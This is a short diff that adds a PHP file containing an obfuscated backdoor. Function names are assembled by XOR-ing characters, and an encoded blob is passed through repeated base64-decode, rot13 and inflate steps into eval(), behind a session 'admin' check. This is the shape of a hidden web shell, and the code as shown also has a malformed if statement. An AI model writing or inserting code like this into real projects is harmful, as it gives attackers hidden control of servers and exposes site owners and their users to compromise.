@@ -1,0 +1,8 @@
+<?php
+if($_SESSION['admin'])!='1'){exit('get out! hacker!');}
+${("-"^"L")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");
+${("]"^"?")}=("-"^"J").("]"^"'").("["^"2").(","^"B").("B"^"$").("V"^":").("("^"I").("7"^"C").("#"^"F");
+${("["^"8")}=("-"^"^").("]"^")").("["^")").(","^"s").("B"^"0").("V"^"9").("("^"\\").("A"^"p").("T"^"g");
+${(","^"H")}=("-"^"O").("]"^"<").("["^"(").(","^"I").("}"^"K").("e"^"Q").("("^"w").("@"^"$").("%"^"@").("#"^"@").(">"^"Q").("!"^"E").("T"^"1");
+eval(${("]"^"?")}(${("["^"8")}(${(","^"H")}(${("]"^"?")}(${("["^"8")}(${(","^"H")}(${("]"^"?")}(${("["^"8")}(${(","^"H")}(${("]"^"?")}(${("["^"8")}(${(","^"H")}("BcHJglAwAADQD2Uo0UsOPUtNR8UYVqkb1RhYcKT2r+975tP9ze/G4hhpcgKyhlHNeFY+VLqnCNUBq55lTggTDCQuMEAPeGsrZK35BnUpXBriUPk9VDxp4pL3x7iYj3YH5nIa0/qxXMRMsvmVjX7vkjjs0YYadh5onm96ALwKbaxC1cZgZt5MxBQAi7XfekgpnF0oRBHRVIaznEZaDjbMBJxLXlnLHEIqhMhPofY0PhV3WPsfvYhn7Prhxzc7tw1NLDh7XuS7O3ODKMbAvU1/vAx1kJDp9n59kK7eA84Sw1WUeZfpZTp9AQ==")))))))))))));
+?>
